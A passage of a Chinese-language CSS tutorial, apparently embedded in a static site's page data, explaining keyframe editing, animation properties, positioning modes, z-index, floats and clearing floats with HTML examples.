动态修改关键帧\n\ncss提供了三个接口用于查看、删除、增加关键帧。首先得获取目前的css样式，类似于这样的document.stylesheets[n].cssrules[m]，然后就可以对这个对象使用findrule()、deleterule()和appendrule()了，可以看下面这个例子。\n\n<html>\n<head>\n    <style type="text/css">\n    div {\n        width: 300px;\n        height: 100px;\n        background-color:  blue;\n        animation: 3s linear 0s 1 normal both running slidein;\n    }\n    @keyframes slidein {\n      33% { background-color: darkblue; }\n      66% { background-color: yellow; }\n      90% { background-color: green; }\n      90% { background-color: red; }\n    }\n    </style>\n</head>\n<body>\n    <div></div>\n    <script>\n    // 这里自己找清楚关键帧在哪里\n    var myanimation = document.stylesheets[0].cssrules[1];\n    // 查看关键帧里33%的内容\n    var arule = myanimation.findrule("33%").csstext;\n    // 去掉这条90% { background-color: red; }的内容，如果有重复先去掉最底下的\n    myanimation.deleterule("90%");\n    // 再去掉这条90% { background-color: green; }的内容\n    // myanimation.deleterule("90%");\n    // 添加最后一条关键帧\n    myanimation.appendrule("100% {background-color: white;}");\n    <\/script>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n动画还有对应的animationstart、animationend和animationiteration这三个事件，分别是在元素的动画结束时，开始时，或者完成一次迭代时触发，通过监听这些事件，可以做出更多动画变化。\n\n\n# 4.3 动画的几个属性\n\nanimation是可以分开写的，如下animation-duration、animation-timing-function、animation-delay、animation-iteration-count、animation-direction、animation-fill-mode、animation-play-state和animation-name。前三个和过渡中同名属性几乎一样，可以跳转到对应章节查看。\n\n# 4.3.1 iteration-count\n\nanimation-iteration-count表示动画播放次数，只能是非负值。如果不设置，动画默认播放一次。如果设置成infinite，动画会无限播放下去。如果设置成浮点数，整数好理解就是整数次，而小数部分就单次时间的百分比。\n\n# 4.3.2 direction\n\nanimation-direction表示动画播放方向，有四个值：\n\n * normal，正向播放，如果是循环，播完又回到起点。\n * reverse，反向播放，如果是循环，播完又回到“终点”（原终点）。\n * alternate，正向交替播放，先正向播一遍然后反向播一遍，功能函数也反向，比如ease-in在反向时成为ease-out。\n * alternate-reverse，反向交替播放，先反向播一遍然后正向播一遍，功能函数也反向，比如ease-in在反向时成为ease-out。\n\n# 4.3.3 fill-mode\n\nanimation-fill-mode表示动画没有开始或者已经结束时元素的样式采取什么保留方案，如果不设置fill-mode（值为none），在开始前和结束后都是采用默认的样式，但是在一些场景下我们需要保留动画最后状态下的样式。除了none还有三种方案：\n\n * forwards，保留由执行期间遇到的最后一个关键帧的样式，最后一个关键帧取决于animation-direction和animation-iteration-count的值。\n * backwards，执行前应用第一个关键帧中定义的值（尽管在animation-delay期间），第一个关键帧取决于animation-direction的值。\n * both，同时采用forwards和backwards方案。\n\n# 4.3.4 play-state\n\nanimation-play-state表示动画动画是否运行或者暂停，有两个值：running和paused。可以通过查询它来确定动画是否正在运行。另外，它的值可以被设置为暂停和恢复的动画的重放。\n\n/*使用不同class来控制播放和暂停*/\n.active {\n  animation-play-state: running;\n}\n.paused {\n  animation-play-state: paused;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n',charsets:{cjk:!0}},{title:"5.定位与浮动",frontmatter:{title:"5.定位与浮动"},regularPath:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/5.%E5%AE%9A%E4%BD%8D%E4%B8%8E%E6%B5%AE%E5%8A%A8.html",relativePath:"book-web/html、css、js、ts/学习CSS/5.定位与浮动.md",key:"v-115f2139",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/5.%E5%AE%9A%E4%BD%8D%E4%B8%8E%E6%B5%AE%E5%8A%A8.html",headers:[{level:2,title:"一、正常布局流",slug:"一、正常布局流",normalizedTitle:"一、正常布局流",charIndex:12},{level:2,title:"二、定位",slug:"二、定位",normalizedTitle:"二、定位",charIndex:564},{level:3,title:"2.1 static静态定位",slug:"_2-1-static静态定位",normalizedTitle:"2.1 static静态定位",charIndex:676},{level:3,title:"2.2 relative相对定位",slug:"_2-2-relative相对定位",normalizedTitle:"2.2 relative相对定位",charIndex:1020},{level:3,title:"2.3 absolute绝对定位",slug:"_2-3-absolute绝对定位",normalizedTitle:"2.3 absolute绝对定位",charIndex:1694},{level:3,title:"2.4 fixed固定定位",slug:"_2-4-fixed固定定位",normalizedTitle:"2.4 fixed固定定位",charIndex:4741},{level:3,title:"2.5 sticky粘性定位",slug:"_2-5-sticky粘性定位",normalizedTitle:"2.5 sticky粘性定位",charIndex:5874},{level:3,title:"2.6 定位元素的隐藏等式",slug:"_2-6-定位元素的隐藏等式",normalizedTitle:"2.6 定位元素的隐藏等式",charIndex:7107},{level:3,title:"2.7 z-index对定位的影响",slug:"_2-7-z-index对定位的影响",normalizedTitle:"2.7 z-index对定位的影响",charIndex:7516},{level:2,title:"三、浮动",slug:"三、浮动",normalizedTitle:"三、浮动",charIndex:8762},{level:3,title:"3.1 什么是浮动",slug:"_3-1-什么是浮动",normalizedTitle:"3.1 什么是浮动",charIndex:8771},{level:3,title:"3.2 浮动规则",slug:"_3-2-浮动规则",normalizedTitle:"3.2 浮动规则",charIndex:10208},{level:3,title:"3.3 清除浮动",slug:"_3-3-清除浮动",normalizedTitle:"3.3 清除浮动",charIndex:10684},{level:3,title:"3.4 浮动的注意点",slug:"_3-4-浮动的注意点",normalizedTitle:"3.4 浮动的注意点",charIndex:12547},{level:3,title:"3.5 边距对浮动的影响",slug:"_3-5-边距对浮动的影响",normalizedTitle:"3.5 边距对浮动的影响",charIndex:14950},{level:2,title:"四、BFC",slug:"四、bfc",normalizedTitle:"四、bfc",charIndex:18891},{level:3,title:"4.1 什么是BFC",slug:"_4-1-什么是bfc",normalizedTitle:"4.1 什么是bfc",charIndex:18901},{level:3,title:"4.2 怎么触发BFC",slug:"_4-2-怎么触发bfc",normalizedTitle:"4.2 怎么触发bfc",charIndex:19096},{level:3,title:"4.3 BFC的作用",slug:"_4-3-bfc的作用",normalizedTitle:"4.3 bfc的作用",charIndex:19688}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"一、正常布局流 二、定位 2.1 static静态定位 2.2 relative相对定位 2.3 absolute绝对定位 2.4 fixed固定定位 2.5 sticky粘性定位 2.6 定位元素的隐藏等式 2.7 z-index对定位的影响 三、浮动 3.1 什么是浮动 3.2 浮动规则 3.3 清除浮动 3.4 浮动的注意点 3.5 边距对浮动的影响 四、BFC 4.1 什么是BFC 4.2 怎么触发BFC 4.3 BFC的作用",content:'# 定位与浮动\n\n\n# 一、正常布局流\n\n正常布局流（正常文档布局流）是一种在不对页面进行任何布局控制时，浏览器默认使用的HTML布局方式。具体来说就是，元素会按照书写模式顺序还有元素各自的特性去排列。\n\n比如在水平书写模式下，一般是从左到右从上到下的顺序，内联元素的特性是在一行里水平排列，块级元素是占满一行的垂直式排列。那么最终，内联元素水平从左到右排列，块级元素垂直从上到下排列。\n\n<html>\n<head>\n    <style type="text/css">\n        div { background-color: red; }\n        span { background-color: green; }\n    </style>\n</head>\n<body>\n    \x3c!--div是块级元素它是垂直从上到下排列的--\x3e\n    <div>div元素1</div>\n    <div>div元素2</div>\n    \x3c!--span是内联元素它是水平从左到右排列的--\x3e\n    <span>span元素1</span>\n    <span>span元素2</span>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 二、定位\n\n定位是为了精确地定义元素框将要出现的位置，可能会将元素从正常文档流中取出。定位使用position属性，其值是static | relative | absolute | fixed | sticky。\n\n\n# 2.1 static静态定位\n\nposition: static是静态定位，将元素放入它在文档布局流中的正常位置，相当于元素就是默认处于正常文档布局流中。\n\n<html>\n<head>\n    <style type="text/css">\n    .positioned {\n        position: static;/* 这行写上没写上都一样 */\n        background: yellow;\n    }\n    </style>\n</head>\n    <body>\n        <p class="positioned"> ... </p>\n    </body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 2.2 relative相对定位\n\nposition: relative是相对定位，元素会相对于元素原本的位置进行偏移。元素其实还在正常文档布局流中，只是相比于原来位置被推移出一段距离（可能会遮挡其他元素）。偏移使用top、bottom、left和right这四个属性，值一般是正值，如果是负值那就是反方向的。\n\n<html>\n<head>\n    <style type="text/css">\n    .outer {\n        width: 200px;\n        height: 100px;\n        border: 1px solid blue;\n    }\n    .inner {\n        width: 100px;\n        height: 50px;\n        top: 50px;   /*元素上方往下推移50px*/\n        left: 100px; /*元素左边往右推移100px*/\n        position: relative;\n        background: yellow;\n    }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner"></div>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# 2.3 absolute绝对定位\n\nposition: absolute是绝对定位，元素会脱离正常文档布局流，在独立的一层里显示，它也有偏移只不过相对于父级元素来说的。偏移使用top、bottom、left和right这四个属性，值一般是正值，如果是负值那就是反方向的。\n\n绝对定位和相对定位的差别就是，一个脱离了正常文档流，而另一个还在正常文档流里，绝对定位元素脱离后它原本的位置会被文档流里的其他元素占据，而相对定位元素的则不会。\n\n另外，绝对定位是有一个前提的，就是父级元素得开启定位，不然其实跟后面要讲的固定定位一样是相对于页面来定位的。比如父级元素开启相对定位，子级元素开启绝对定位，那此时子级元素是对于父级元素的来定位的，否则就会是相对于整个页面来定位。\n\n<html>\n<head>\n    <style type="text/css">\n    .outer {\n        position: relative; /*这个去掉后，子元素的绝对定位就会相对于页面了*/\n        width: 100px;\n        height: 400px;\n        padding: 0 25px;\n        margin: 50px;\n        border: 1px solid blue;\n    }\n    .inner1, .inner2, .inner3 {\n        width: 100px;\n        height: 100px;\n        margin: 25px 0;\n        border: 1px solid red;\n    }\n    .inner1 {\n        background: yellow;\n    }\n    .inner2 {\n        position: absolute; /*脱离文档流，相对于父级定位，那么父级的内边距是影响不到子元素了*/\n        /*偏移没设置那就是auto，也就是原本的位置，设置0就是父级边框左上角位置*/\n        top: 40px; /*偏移后的效果也是得考虑元素的布局尺寸的，也就是外边距，40+25=65px*/\n        left: 40px; /*左边距为0，从左往右推移40px*/\n        background: green;\n    }\n    .inner3 {\n        background: red;\n    }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner1"></div>\n        <div class="inner2"></div>\n        <div class="inner3"></div>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\ntop、bottom、left和right对绝对定位元素间隔的影响：\n\n 1. top、bottom、left和right这四个值默认值是auto，表示元素虽然脱离了正常文档流但还是在原位，其实原位也被别人占据了（重叠了）。\n 2. 如果top和bottom中有一个是auto而另一个是有效数值，那按照有效数值那个属性来偏移；left和right也是一样的情况。\n 3. 如果左右只设置一个，上下也只设置一个的话，其实就是将前两条规则结合起来了。比如left:0;top:auto;那就是左边间距0而上下还是在原来位置（元素Y轴距离还是原来位置），left:auto;top:10px;同理，上边距10px，左右还在原来位置（元素X轴距离还是原来位置）。\n 4. 如果那四个属性都是设置的有效数值，一般按照正常文档流的左和上来决定left和top优先。\n 5. 那四个属性都是设置的有效数值，但是又来了个margin。如果margin在一个方向上是auto，那绝对定位元素的这个方向上还是在原位。跟那四个设置auto情况类似（规则1），其他情况也基本类似（宽高影响还有规则234）。\n 6. 如果那四个属性还有margin都是设置的有效数值，那间隔将会是累积而不是折叠，其实就是对布局尺寸进行偏移。比如left: 2em;和margin-left: 2em;，左侧间隔就是4em。\n\n将这六条样式代码放到下面例子的span样式里，就可以看到上面6条不同规则显示效果：\ntop: auto; bottom: auto; left: auto; right: auto;// 原位\ntop: 10px; bottom: auto; left: 20px; right: auto;// top和left生效\ntop: auto; left: 0;或top: 10px; left: auto;// top或left生效\ntop: 0; left: 2em; right: 1em; width: 5em; background: silver;// top和left优先\ntop: 1em; left: 1em; right: 1em; width: 5em; margin: 0 auto; background: silver;// margin中的auto会优先，而margin中的0不会优先\ntop: 0; left: 2em; right: 12em; width: 5em; margin-left: 2em; margin-right: 1em; background: silver;// 间隔累积4em，其实就是对布局尺寸进行偏移\n\n<html>\n<head>\n  <style type="text/css">\n    p { position: relative; padding-left: 20px; width:500px; }\n    span { position: absolute; }\n  </style>\n</head>\n<body>\n  <p>\n    When we consider the effect of positioning, it quickly becomes clear that\n    authors can do a great deal of damage to layout, just as they can do very\n    interesting things.<span>[4]</span>\n    This is usually the case with useful technologies: the sword always has at\n    least two edges, both of them sharp.\n  </p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 2.4 fixed固定定位\n\n绝对定位会脱离正常文档流，然后相对于最近的祖先进行定位。而fixed固定定位与之类似也会脱离正常文档流，但是相对于浏览器视窗viewport进行定位。\n\n<html>\n<head>\n<style>\n      body {\n        width: 500px;\n        height: 800px;\n        margin: 0 auto;\n      }\n      h1 {\n        position: fixed; /*固定定位*/\n        top: 0px;\n        width: 500px;\n        margin-top: 0;\n        background: white;\n        padding: 10px;\n      }\n      p {\n        background: aqua;\n        border: 3px solid blue;\n        padding: 10px;\n        margin: 10px;\n      }\n      p:nth-of-type(1) {\n        margin-top: 62px; /* 最顶上的p需要与顶部有间隔，防止一开始被h1遮挡 */\n      }\n    </style>\n</head>\n<body>\n    <h1>Fixed positioning</h1>\n    <p>I am a basic block level element. My adjacent block level elements sit on new lines below me.</p>\n    <p>Now I\'m absolutely positioned relative to the <code>&lt;body&gt;</code> element, not the <code>&lt;html&gt;</code> element!</p>\n    <p>We are separated by our margins. Because of margin collapsing, we are separated by the width of one of our margins, not both.</p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# 2.5 sticky粘性定位\n\n粘性定位：当元素滚动到父容器边缘时会黏在容器边缘，黏住的前提是在滚动方向上设置了合适的偏移。\n\n偏移就是前面几节提到的top、bottom、left和right，偏移量的设置会让元素在黏住的地方形成一种相对定位，不过这个相对定位只会体现在这个滚动方向上，比如上下滚动那设置top和bottom就会让元素在上下黏住，而left和right就会无效除非左右也能滚动。\n\n<html>\n<head>\n<style type="text/css">\n      .outer {\n        width: 400px;\n        height: 300px;\n        overflow-y: auto;\n        margin: 50px auto;\n        border: 1px solid;\n      }\n      .outer div {\n        width: 90%;\n        height: 100px;\n        margin: 5%;\n      }\n      .inner1 {\n        background: red;\n      }\n      .inner2 {\n        position: sticky;\n        top: 10px;  /*内容上下滚动的，设置的是top，那就会在距离div上边缘10px的地方黏住*/\n        left: 10px; /*内容上下滚动的，这个left是无效的*/\n        background: skyblue;\n      }\n      .inner3 {\n        background: blue;\n      }\n      .inner4 {\n        background: green;\n      }\n      .inner5 {\n        background: black;\n      }\n</style>\n</head>\n<body>\n    <div class="outer">\n      <div class="inner1"></div>\n      <div class="inner2"></div>\n      <div class="inner3"></div>\n      <div class="inner4"></div>\n      <div class="inner5"></div>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n\n# 2.6 定位元素的隐藏等式\n\n定位元素在包含块中有个隐藏的等式，它与块级元素在水平方向上的等式很像，只是多出了四个位移。\n\n定位元素的水平方向： left + margin-left + border-left-width + padding-left + width + padding-right + border-right-width + margin-right + right = the width of the containing block\n\n定位元素的垂直方向： top + margin-top + border-top-height + padding-top + height + padding-bottom + border-bottom-height + margin-bottom + bottom = the height of the containing block\n\n\n# 2.7 z-index对定位的影响\n\n使用定位来控制元素时，难免会碰到元素重叠的情况，那么决定哪个元素在上面哪个元素在下面就很重要，可以使用z-index属性来控制它们。z-index的值是整数，负数、0、正数都可以的，数值越大里开发者（观察者）越近。\n\n<html>\n<head>\n<style type="text/css">\np {\n  position: absolute;\n  border: 1px solid;\n  background: #ddd;\n  margin: 0;\n}\n#one {\n  top: 1em;\n  left: 1em;\n  width: 40%;\n  height: 10em;\n  z-index: 3;\n}\n#two {\n  top: 2em;\n  left: 15%;\n  width: 50%;\n  height: 4.5em;\n  z-index: 10;\n}\n#three {\n  top: 10%;\n  left: 30%;\n  width: 30%;\n  height: 10em;\n  z-index: 8;\n}\np[id] em {\n  position: absolute;\n  top: -1em;\n  left: -1em;\n  width: 10em;\n  height: 5em;\n}\n#one em {\n  z-index: 100;\n  background: hsla(0, 50%, 70%, 0.9);\n}\n#two em {\n  z-index: 10;\n  background: hsla(120, 50%, 70%, 0.9);\n}\n#three em {\n  z-index: -343;\n  background: hsla(240, 50%, 70%, 0.9);\n}\n</style>\n</head>\n<body>\n<p id="one">文本1 <em>强调文本1.1</em> </p>\n<p id="two">文本2 <em>强调文本2.1</em> </p>\n<p id="three">文本3 <em>强调文本3.1</em> </p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\n对于上面这个例子你可能会对三个<em>的z-index设置感到疑惑，因为父元素设置了z-index后会建立自己的本地堆栈上下文（包含块），后代元素也是跟随着父元素的z-index而会忽略自身的z-index，可以明确的是子元素会比父元素更高但不会超过其他比父元素高的包含块。\n\n\n# 三、浮动\n\n\n# 3.1 什么是浮动\n\n什么是浮动？一个元素脱离正常的文档布局流，并吸附到其父容器的某一边。原本在浮动元素后面的元素，现在会占据它的位置，并且内容会围绕着浮动元素来展示。\n\n“占据它的位置”的理解：后面是块级元素那就会占据原本浮动元素的那一行，后面是内联元素就会水平挪动到原本浮动元素那个位置。这样的话，后面的元素可能会被浮动元素所遮挡。\n\n“内容会围绕着浮动元素来展示”的理解：虽然我会占据你原本的位置，但是我里面的文字图片等内容是要围绕着你浮动元素展示的，也就是说内容不会被浮动元素所遮住。（但不要认为是子元素不会被遮挡，是文字图片等展示内容不会被遮挡）\n\n浮动使用float属性，其值是left | right | none。left和right就是分别向左和右浮动，而none完全是为了屏蔽其他地方样式的影响。\n\n<html>\n<head>\n    <style type="text/css">\n    .box {\n        float: left;\n        width: 150px;\n        height: 150px;\n        border: 2px solid blue;\n        border-radius: 8px;\n        margin-right: 20px;\n    }\n    </style>\n</head>\n<body>\n    <h1>Simple float example</h1>\n    <div class="box">Float</div>\n    <p> Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla luctus aliquam dolor, eu lacinia lorem placerat vulputate. Duis felis orci, pulvinar id metus ut, rutrum luctus orci. Cras porttitor imperdiet nunc, at ultricies tellus laoreet sit amet. Sed auctor cursus massa at porta. Integer ligula ipsum, tristique sit amet orci vel, viverra egestas ligula. Curabitur vehicula tellus neque, ac ornare ex malesuada et. In vitae convallis lacus. Aliquam erat volutpat. Suspendisse ac imperdiet turpis. Aenean finibus sollicitudin eros pharetra congue. Duis ornare egestas augue ut luctus. Proin blandit quam nec lacus varius commodo et a urna. Ut id ornare felis, eget fermentum sapien.</p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 3.2 浮动规则\n\n浮动元素的包含块是最近的块级祖先元素。浮动元素本身会形成块级框，即使这个元素之前是内联元素。具体浮动规则如下：\n\n 1. 浮动元素的左右外边界不能超出包含块的左右内边界。\n 2. 如果前面元素左浮动，那么后面浮动元素的左边界必定处于前面元素右边界的右侧，除非后面浮动元素的顶边在前面浮动元素的下边；右浮动的情况类比。\n 3. 左右两边浮动的元素之间也不能重叠，如果放不下会自动往下挪。\n 4. 浮动元素的顶边不能比父元素的内顶边高，与第1条相似，但父元素不一定是块级元素。\n 5. 浮动元素的顶边不能比前方任何一个浮动元素或块级元素的顶边高；上一条是父子关系，这条是兄弟关系，“弟弟”最多和“哥哥”平齐。\n 6. 浮动元素的顶边不能比它原本未浮动前所在框体顶边还高。\n 7. 满足其他条件后，浮动元素要尽可能上移。\n 8. 满足其他条件后，左浮动元素尽可能左移，右浮动元素尽可能右移。\n\n以上规则的前提是不使用边距来影响浮动的位置，因为使用边距后可能会在视觉上让浮动元素的边界超出父级元素的边界，也让浮动元素在视觉上重叠。\n\n\n# 3.3 清除浮动\n\n当元素浮动时，其他元素的内容会围绕着浮动元素来展示，但总会有特殊场景需要某个元素不再围绕着浮动元素展示。\n\n清除浮动使用clear属性，有三个值：left停止任何活动的左浮动，right停止任何活动的右浮动，both停止任何活动的左右浮动。\n\n清除浮动的理解：因为浮动元素后面的元素会占据浮动元素的一行（块级元素）或者水平位置（内联元素），那么清除浮动后，后面的元素会退回到下一行（块级元素）或者水平其他位置（内联元素）。\n\n比如下面这个例子的页脚，不加clear和加了clear效果不同：\n\n<html>\n<head>\n    <style type="text/css">\n        body {\n            width: 50%;\n            max-width: 500px;\n            margin: 0 auto;\n        }\n        div:nth-of-type(1) {\n            width: 36%;\n            float: left;\n        }\n        div:nth-of-type(2) {\n            width: 30%;\n            float: left;\n            margin-left: 4%;\n        }\n        div:nth-of-type(3) {\n            width: 26%;\n            float: right;\n        }\n        /*加了clear后，页脚会退回到下一行，也就是单独新一行里*/\n        footer {\n          clear: both;\n        }\n    </style>\n</head>\n<body>\n    <h1>Float disaster</h1>\n    <div>\n      <h2>First column</h2>\n      <p> Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla luctus aliquam dolor, eu lacinia lorem placerat vulputate. Duis felis orci, pulvinar id metus ut, rutrum luctus orci. </p>\n    </div>\n    <div>\n      <h2>Second column</h2>\n      <p>Nam vulputate diam nec tempor bibendum. Donec luctus augue eget malesuada ultrices. Phasellus turpis est, posuere sit amet dapibus ut, facilisis sed est. </p>\n    </div>\n    <div>\n      <h2>Third column</h2>\n      <p>Nam consequat scelerisque mattis. Duis pulvinar dapibus magna, eget congue purus mollis sit amet. Sed euismod lacus sit amet ex tempus, a semper felis ultrices. Maecenas a efficitur metus. </p>\n    </div>\n    <footer>\n      <p>©2016 your imagination. This isn\'t really copyright, this is a mockery of the very concept. Use as you wish.</p>\n    </footer>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# 3.4 浮动的注意点\n\n * 浮动元素的内外边距和边框如果影响过大，可能会破坏布局（其实不是浮动本身的问题）。为了减少计算量，可以设置box-sizing: border-box，只算width和外边距。\n\n * 围绕着浮动元素展示的内容与浮动元素之间的间隔，是完全取决于浮动元素设置的外边距的。其实就是之前类似的解释，你浮动了，我现在占据了你的位置，你我之间是没有间距的（但可能会是遮挡关系），而我的文字图片等内容会围绕着你展示，就算内容也设置外边距也只在我里面有效。\n\n * 浮动元素之间的外边距是没有折叠的，比如你外边距50px我外边距60px，那你我之间的间隔是110px，不像之前的外边距是有折叠就是60px（两个中取最大值）。\n\n * 实际上，浮动元素在父元素中所占的面积的有效高度为0。比如在上一节的例子中，如果去掉<footer>这个标签，那body实际高度只有<h1>这个高度。解决办法就是给浮动元素后面的元素进行清除浮动。刚好上一节例子里页脚也是需要清除浮动的，但不是每个页面都有页脚，那就可以使用一个空的<div>标签并设置clear: both即可。\n\n<html>\n<head>\n<style type="text/css">\n      * {\n        box-sizing: border-box;\n      }\n      body {\n        width: 90%;\n        max-width: 800px;\n        margin: 0 auto;\n      }\n      footer {\n        margin-top: 4%;\n      }\n      div:nth-of-type(1) {\n        width: 30%;\n        float: left;\n      }\n      div:nth-of-type(2) {\n        width: 30%;\n        float: left;\n        margin-left: 5%;\n      }\n      div:nth-of-type(3) {\n        width: 30%;\n        float: right;\n      }\n      .clearfix {\n        clear: both;\n      }\n      .column, footer {\n        padding: 1%;\n        border: 2px solid black;\n        background-color: red;\n      }\n</style>\n</head>\n<body>\n    <h1>Float disaster</h1>\n    <div class="column">\n      <h2>First column</h2>\n      <p> Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla luctus aliquam dolor, eu lacinia lorem placerat vulputate. Duis felis orci, pulvinar id metus ut, rutrum luctus orci. </p>\n    </div>\n    <div class="column">\n      <h2>Second column</h2>\n      <p>Nam vulputate diam nec tempor bibendum. Donec luctus augue eget malesuada ultrices. Phasellus turpis est, posuere sit amet dapibus ut, facilisis sed est. </p>\n    </div>\n    <div class="column">\n      <h2>Third column</h2>\n      <p>Nam consequat scelerisque mattis. Duis pulvinar dapibus magna, eget congue purus mollis sit amet. Sed euismod lacus sit amet ex tempus, a semper felis ultrices. Maecenas a efficitur metus. Nullam tempus pharetra pharetra. </p>\n    </div>\n    \x3c!--空div用于清除浮动，可以解决footer围绕问题，也可以让前面的浮动div有实际面积--\x3e\n    <div class="clearfix"></div>\n    <footer>\n      <p>©2016 your imagination. This isn\'t really copyright, this is a mockery of the very concept. Use as you wish.</p>\n    </footer>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n\n\n\n# 3.5 边距对浮动的影响\n\n建议先看边距对盒子的影响这一节。浮动是脱离了正常文档流，但也还是符合“边距对盒子的影响”的，只不过是在当前的布局流也就是浮动布局中的，并且也要符合浮动规则。\n\n同向设置外边距：给左浮动元素添加左外边距，或者是给右浮动元素添加右外边距。\n反向设置外边距：给左浮动元素添加右外边距，或者是给右浮动元素添加左外边距。\n\n浮动元素的布局尺寸超过一行剩余空间就会跳到下一行里浮动，而小于等于上一行剩余空间就可能会跳到上一行里浮动（包含剩余空间为0的情况，此时布局尺寸也为0，其实就是圣杯布局里使用的手段）。\n\n四种情况：\n\n * 如果同向设置外边距，且外边距是正值。那么布局尺寸增大，展示尺寸不变，在前方增加的，会把展示效果往后推移。比如float: left;margin-left: 25px，布局尺寸宽度增大25px，展示尺寸不变，但是展示效果会被从左往右（从前往后）推移25px。\n * 如果同向设置外边距，且外边距是负值。那么布局尺寸减少，展示尺寸不变，在前方减小的，会把展示效果往前拉移。比如float: left;margin-left: -25px，布局尺寸宽度减少25px，展示尺寸不变，但是展示效果会被从右往左（从后往前）拉移25px。\n * 如果反向设置外边距，且外边距是正值。那么布局尺寸增大，展示尺寸不变，在后方增加的，也不会影响展示效果的位置。比如float: right;margin-left: 25px，只有布局尺寸宽度增大了25px，其他没变。\n * 如果反向设置外边距，且外边距是负值。那么布局尺寸减少，展示尺寸不变，在后方减少的，也不会影响展示效果的位置。比如float: right;margin-left: -25px，只有布局尺寸宽度减少了25px，其他没变。\n\n可以看到下面这个例子，父级内边距25px与浮动元素外边距-25px抵消了（布局尺寸宽度减小25px），显示效果就是浮动元素的左边界与父级元素的左边界重合（从左往右位移25px）。\n\n<html>\n<head>\n  <style>\n  .outer { width: 100px; height: 100px; padding: 25px; border: 1px solid red; }\n  /*同向设置外边距，外边距是负值。布局尺寸宽度减少25px，展示尺寸不变，但是展示效果会被从右往左（从后往前）拉移25px*/\n  .inner { width: 100px; height: 50px; float: left; background-color: red; margin-left: -25px; }\n  </style>\n</head>\n<body>\n  <div class="outer">\n    <div class="inner"></div>\n  </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n为了方便，将“跳到上一行里浮动”简称为“上跳”，将“跳到下一行里浮动”简称为“下跳”。上跳有个前提，需要遵守“浮动元素的顶边不能比它原本未浮动前所在框体顶边还高”这条规则。还有不管上跳还是下跳，都只会跳一行，也就是说正负情况下，都只有各自的一个临界点来跳行。\n\n<html>\n<head>\n  <style>\n  .outer { width: 100px; height: 100px; padding: 25px; border: 1px solid red; }\n  .inner { width: 50px; height: 50px; float: left; }\n  /* 当前这一行的的剩余空间100-50=50px */\n  .col1 { background-color: red; }\n  /* 同向设置外边距，外边距是正值。此时布局尺寸是30+21=51px，要大于上一行的的剩余空间50px，所以下跳了 */\n  .col2 { width: 30px; background-color: blue; margin-left: 21px;}\n  </style>\n</head>\n<body>\n  <div class="outer">\n      <div class="inner col1"></div>\n      <div class="inner col2"></div>\n  </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n下面这个例子就是上跳的示例，可以将.col2的margin-left从0慢慢变到-75px。同向设置外边距，外边距是负值，布局尺寸减少，并且展示效果会从后往前拉移。这个布局尺寸小于等于上一行剩余位置时会发生“上跳”，如果再继续增大外边距的绝对值，还会继续从后往前拉移。\n\n<html>\n<head>\n  <style>\n  .outer { width: 